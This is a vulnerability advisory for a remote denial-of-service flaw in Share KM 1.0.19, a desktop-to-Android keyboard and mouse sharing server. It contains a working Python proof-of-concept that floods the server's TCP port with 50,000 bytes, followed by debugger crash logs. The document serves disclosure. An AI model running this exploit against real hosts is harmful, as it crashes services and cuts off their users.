@@ -1,0 +1,174 @@
+Advisory Information :
+======================
+Title : Share KM 1.0.19 - Remote Denial Of Service
+Advisory ID : Cr02013-001
+Product : Share KM desktop setup file
+Vendor : SmartUX
+Vulnerable Version(s) : 1.0.19 and probably prior release
+Tested Version : 1.0.19
+Tested On : Windows 7
+Vulnerability Type / CWE ID : Improper Resource Shutdown or Release / [CWE-404]
+Risk Level : High
+CVSSv2 Base Score : 9.7 (AV:N/AC:L/Au:N/C:N/I:P/A:C/E:F/RL:U/RC:C/CDP:LM/TD:H/CR:L/IR:L/AR:H)
+Discovered By : Yuda (gunslinger_) Prawira of cr0security - yuda[at]cr0security.com - http://www.cr0security.com
+
+
+Introduction :
+==============
+Share Keyboard & Mouse (Beta)
+Control your Droid from your desktop with MOUSE and KEYBOARD. Just like 
+a Synergy. # ShareKM is a very handy tool for Android that lets you share 
+your computer's Mouse, Keyboard and Clipboard. You can download PC app at 
+http://goo.gl/khfEb.
+
+- Based on / Copied from : https://play.google.com/store/apps/details?id=com.liveov.skm&hl=en
+
+
+Advisory Details:
+=================
+Share KM suffers from Remote Denial Of Service (DOS). The Attacker could 
+make Share KM pc Server Crash or disconnect connection while Android 
+client is connected to Share KM server on PC. and the attacker could make
+Share KM server Crash when user is Showing RTT from notification taskbar.
+
+
+Proof Of Concept :
+==================
+The Attacker run this remote exploit DOS code targeted to remote server host, 
+and the connection between server and android client will be disconected.
+
+--- Python Remote DOS code ---
+#!/usr/bin/python
+import socket
+
+TCP_IP = '192.168.1.100'
+TCP_PORT = 55554
+BUFFER_SIZE = 1024
+MESSAGE = "\x41" * 50000 
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+s.send(MESSAGE)
+s.close()
+------------- EOF -------------
+
+And after connection disconected, Show RTT on ShareKM icon in notification 
+taskbar. Application will be crashed.
+
+With debugging (Log) :
+0:006> g
+04:56:44:720 : I Wifi.cpp(50, 0x186C)                : accept() call succeeded. CientSocket = [0x220]
+04:56:45:203 : W RMISession.cpp(362, 0x186C)         : Ctrl.rcpSessionConfig: uinput_flags.3, sdkVer.f, nativeVer
+04:56:45:203 : W ProtocolHandler.cpp(30, 0x186C)     : sdkver.15, resol: 1024 x 552
+04:56:45:204 : I DlgBase.h(143, 0x186C)              : onSessionEvent event: wifi client is connected.
+04:56:45:205 : I MessageSink.cpp(1096, 0x1F00)       : StartInitWindowthread 
+04:56:45:205 : I MessageSink.cpp(1109, 0x1F00)       : StartInitWindowthread default desk
+04:56:45:206 : I MessageSink.cpp(210, 0x15E0)        : InitWindow called
+04:56:45:206 : I MessageSink.cpp(223, 0x15E0)        : InitWindow:OpenInputdesktop OK
+04:56:45:206 : I MessageSink.cpp(235, 0x15E0)        : InitWindow:SelectHDESK to Default (23c) from 28
+04:56:45:207 : I MessageSink.cpp(117, 0x15E0)        : wmcreate  
+04:56:45:207 : I MessageSink.cpp(316, 0x15E0)        : Load hookdll's
+04:56:45:207 : D MessageSink.cpp(341, 0x15E0)        : ---trace---
+04:56:45:207 : D MessageSink.cpp(347, 0x15E0)        : ---trace---
+04:56:45:207 : D MessageSink.cpp(353, 0x15E0)        : ---trace---
+04:56:45:207 : I MessageSink.cpp(357, 0x15E0)        : OOOOOOOOOOOO start dispatch
+04:56:45:207 : D MessageSink.cpp(360, 0x15E0)        : ---trace---
+04:56:45:207 : I MessageSink.cpp(1134, 0x1F00)       : StartInitWindowthread started
+04:56:45:207 : I RMISession.cpp(68, 0x1F00)          : Global message hook is installed.
+04:56:52:926 : I MessageSink.cpp(932, 0x15E0)        : MessageSink::onKey: Key char= , vk=VK_UP       
+(26), nagr=0, lParam=0x01480001: scan.0148, press extended 
+04:56:52:927 : I MessageSink.cpp(993, 0x15E0)        : modifier.old=2000, new=2000
+04:56:53:046 : I MessageSink.cpp(932, 0x15E0)        : MessageSink::onKey: Key char= , vk=VK_UP       
+(26), nagr=0, lParam=0x81480001: scan.0148, release extended 
+04:56:53:046 : I MessageSink.cpp(993, 0x15E0)        : modifier.old=2000, new=2000
+, vk=VK_RETURN   (0d), nagr=0, lParam=0x001c0001: scan.001c, press  onKey: Key char=
+04:56:53:868 : I MessageSink.cpp(993, 0x15E0)        : modifier.old=2000, new=2000
+04:56:53:939 : T TSocket.cpp(358, 0x186C)            : closesocket(0)
+04:56:53:939 : I Wifi.cpp(50, 0x186C)                : accept() call succeeded. CientSocket = [0x124]
+04:56:53:940 : T TSocket.cpp(358, 0x186C)            : closesocket(544)
+04:56:53:941 : T TSocket.cpp(553, 0x1F00)            : recv: ret.-1, E.10004
+04:56:53:941 : I RMISession.cpp(79, 0x1F00)          : read error
+04:56:53:941 : I MessageSink.cpp(1429, 0x1F00)       : unregistered hotkey id=304:56:53:941 : 
+E MessageSink.cpp(1051, 0x1F00)       : enter from MessageSink destructor. 
+04:56:53:941 : I MSWindowsKeyState.cpp(1484, 0x1F00) : ctrl: data.0, real.0/0 
+04:56:53:941 : T TSocket.cpp(164, 0x186C)            : recv error : E.10053
+04:56:53:941 : I MessageSink.cpp(932, 0x15E0)        : MessageSink::onKey: Key char= , vk=VK_LCONTROL 
+(a2), nagr=0, lParam=0x801d0001: scan.001d, release  
+04:56:53:941 : E TSocket.cpp(142, 0x186C)            : send failed: E.10053
+04:56:53:942 : I MessageSink.cpp(993, 0x15E0)        : modifier.old=2000, new=2000
+04:56:53:942 : I RMISession.cpp(468, 0x186C)         : type.1: error flush.
+
+STATUS_STACK_BUFFER_OVERRUN encountered
+(1888.186c): Break instruction exception - code 80000003 (first chance)
+eax=00000000 ebx=01377370 ecx=74f2de28 edx=01fef15d esi=00000000 edi=01a5be50
+eip=74f2dca5 esp=01fef3a4 ebp=01fef420 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+kernel32!UnhandledExceptionFilter+0x5f:
+74f2dca5 cc              int     3
+0:002> d esp
+*** ERROR: Module load completed but symbols could not be loaded for C:\Program Files\ShareKM\ShareKM.exe
+01fef3a4  60 86 98 5d 50 be a5 01-28 31 38 01 d4 f9 fe 01  `..]P...(18.....
+01fef3b4  01 00 00 00 00 00 00 00-78 01 48 00 00 00 00 00  ........x.H.....
+01fef3c4  50 01 48 00 34 f4 fe 01-a2 43 c7 74 38 1e 4c 00  P.H.4....C.t8.L.
+01fef3d4  50 28 4c 00 1c f4 fe 01-2c 00 00 00 00 00 00 00  P(L.....,.......
+01fef3e4  5c f4 00 01 50 28 4c 00-60 01 00 00 40 f4 01 01  \...P(L.`...@...
+01fef3f4  01 00 00 00 00 00 00 00-00 00 00 00 06 00 00 00  ................
+01fef404  00 00 00 00 a4 f3 fe 01-00 65 36 77 d8 f9 fe 01  .........e6w....
+01fef414  6a 9b f5 74 48 7a 97 28-00 00 00 00 54 f7 fe 01  j..tHz.(....T...
+0:002> g
+eax=00000000 ebx=74c5a256 ecx=00000000 edx=00000000 esi=0000004e edi=0386f42c
+eip=77357094 esp=0386f2e0 ebp=0386f2f0 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+ntdll!KiFastSystemCallRet:
+77357094 c3              ret
+0:007>
+
+
+Report-Timeline :
+=================
+21/09/2013 :    Vendor Contacted / No response.
+22/09/2013 :    Public Disclosure.
+
+
+Remediation :
+=============
+There isn't remediation step from the Vendor until this Public Disclosure.
+
+
+References :
+============
+- Common Weakness Enumeration (CWE) - http://cwe.mitre.org
+- Share KM - https://sites.google.com/site/droidskm/ 
+- SmartUX Vendor - https://play.google.com/store/apps/developer?id=SmartUX
+
+
+About Cr0security :
+===================
+Cr0security is a company that moved on "Information and Technologies" especially 
+on Computer Security System, Network Security, and Secure Computer Application 
+Development. with a reference to the publics needs of using the information system 
+technology with better security, Cr0security ready to help you to reach secure point 
+and creating a comfortable moment while you are perform any activities through your 
+networks or computers at once. In computer software development we also implement the 
+"Secure Programming". so security of the applications, the data, and the computer will 
+be strictly maintained. Beside we can act as your Consultant, We can act as your partner 
+to achieve the best solution.
+
+
+Contact Cr0security :
+=====================
+Email : info[at]cr0security.com
+Website : http://www.cr0security.com
+
+
+Disclaimer :
+============
+The information provided in this advisory is provided "as is" without warranty 
+of any kind. Cr0security disclaims all warranties, either express or implied, 
+including the warranties of merchantability and fitness for a particular purpose. 
+In no event shall Cr0security or its suppliers be liable for any damages whatsoever 
+including direct, indirect, incidental, consequential, loss of business profits or 
+special damages, even if Cr0security or its suppliers have been advised of the 
+possibility of such damages. Some states do not allow the exclusion or limitation 
+of liability for consequential or incidental damages so the foregoing limitation may 
+not apply.
